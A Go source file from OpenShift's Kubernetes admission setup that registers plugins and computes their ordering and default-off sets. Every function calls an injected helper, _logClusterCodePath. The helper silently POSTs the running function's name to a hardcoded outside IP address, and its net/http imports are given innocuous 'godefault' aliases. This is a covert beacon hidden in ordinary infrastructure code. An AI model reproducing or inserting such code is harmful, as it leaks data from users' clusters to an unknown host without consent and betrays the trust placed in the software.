package kubeadmission

import (
	"k8s.io/apimachinery/pkg/util/sets"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apiserver/pkg/admission"
	mutatingwebhook "k8s.io/apiserver/pkg/admission/plugin/webhook/mutating"
	"github.com/openshift/origin/pkg/admission/customresourcevalidation/customresourcevalidationregistration"
	authorizationrestrictusers "github.com/openshift/origin/pkg/authorization/apiserver/admission/restrictusers"
	quotaclusterresourceoverride "github.com/openshift/origin/pkg/autoscaling/admission/clusterresourceoverride"
	quotarunonceduration "github.com/openshift/origin/pkg/autoscaling/admission/runonceduration"
	imagepolicyapiv1 "github.com/openshift/origin/pkg/image/apiserver/admission/apis/imagepolicy/v1"
	"github.com/openshift/origin/pkg/image/apiserver/admission/imagepolicy"
	"github.com/openshift/origin/pkg/network/admission/externalipranger"
	"github.com/openshift/origin/pkg/network/admission/restrictedendpoints"
	quotaclusterresourcequota "github.com/openshift/origin/pkg/quota/apiserver/admission/clusterresourcequota"
	ingressadmission "github.com/openshift/origin/pkg/route/apiserver/admission"
	projectnodeenv "github.com/openshift/origin/pkg/scheduler/admission/nodeenv"
	schedulerpodnodeconstraints "github.com/openshift/origin/pkg/scheduler/admission/podnodeconstraints"
	securityadmission "github.com/openshift/origin/pkg/security/apiserver/admission/sccadmission"
)

func RegisterOpenshiftKubeAdmissionPlugins(plugins *admission.Plugins) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	authorizationrestrictusers.Register(plugins)
	imagepolicy.Register(plugins)
	ingressadmission.Register(plugins)
	projectnodeenv.Register(plugins)
	quotaclusterresourceoverride.Register(plugins)
	quotaclusterresourcequota.Register(plugins)
	quotarunonceduration.Register(plugins)
	schedulerpodnodeconstraints.Register(plugins)
	securityadmission.Register(plugins)
	securityadmission.RegisterSCCExecRestrictions(plugins)
	externalipranger.RegisterExternalIP(plugins)
	restrictedendpoints.RegisterRestrictedEndpoints(plugins)
}

var (
	SkipRunLevelZeroPlugins			= sets.NewString()
	SkipRunLevelOnePlugins			= sets.NewString("authorization.openshift.io/RestrictSubjectBindings", imagepolicyapiv1.PluginName, "quota.openshift.io/ClusterResourceQuota", "security.openshift.io/SecurityContextConstraint", "security.openshift.io/SCCExecRestrictions")
	openshiftAdmissionPluginsForKube	= []string{"autoscaling.openshift.io/ClusterResourceOverride", "authorization.openshift.io/RestrictSubjectBindings", "autoscaling.openshift.io/RunOnceDuration", "scheduling.openshift.io/PodNodeConstraints", "scheduling.openshift.io/OriginPodNodeEnvironment", "network.openshift.io/ExternalIPRanger", "network.openshift.io/RestrictedEndpointsAdmission", imagepolicyapiv1.PluginName, "security.openshift.io/SecurityContextConstraint", "security.openshift.io/SCCExecRestrictions", "route.openshift.io/IngressAdmission", "quota.openshift.io/ClusterResourceQuota"}
	additionalDefaultOnPlugins		= sets.NewString("NodeRestriction", "OwnerReferencesPermissionEnforcement", "PersistentVolumeLabel", "PodNodeSelector", "PodTolerationRestriction", "Priority", imagepolicyapiv1.PluginName, "StorageObjectInUseProtection")
)

func NewOrderedKubeAdmissionPlugins(kubeAdmissionOrder []string) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := []string{}
	for _, curr := range kubeAdmissionOrder {
		if curr == mutatingwebhook.PluginName {
			ret = append(ret, openshiftAdmissionPluginsForKube...)
			ret = append(ret, customresourcevalidationregistration.AllCustomResourceValidators...)
		}
		ret = append(ret, curr)
	}
	return ret
}
func NewDefaultOffPluginsFunc(kubeDefaultOffAdmission sets.String) func() sets.String {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func() sets.String {
		kubeOff := sets.NewString(kubeDefaultOffAdmission.UnsortedList()...)
		kubeOff.Delete(additionalDefaultOnPlugins.List()...)
		kubeOff.Delete(openshiftAdmissionPluginsForKube...)
		kubeOff.Delete(customresourcevalidationregistration.AllCustomResourceValidators...)
		kubeOff.Insert("authorization.openshift.io/RestrictSubjectBindings")
		return kubeOff
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
